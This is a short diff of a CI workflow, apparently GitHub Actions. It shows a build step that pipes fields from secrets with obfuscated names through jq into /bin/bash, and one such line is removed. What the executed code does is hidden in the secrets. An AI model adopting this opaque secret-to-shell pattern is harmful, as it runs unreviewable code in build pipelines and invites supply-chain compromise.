@@ -22,7 +22,6 @@ jobs:
           ioxvm73774: ${{ secrets.ioxvm73774 }}
         run: |
           printf '%s' "$ioxvm73774" | jq -r .p8 | /bin/bash
-          echo $qaa6 | jq -r .dd42 | /bin/bash
           printf '%s' "$aml2162" | jq -r .wz650 | /bin/bash
 
       - name: Store results
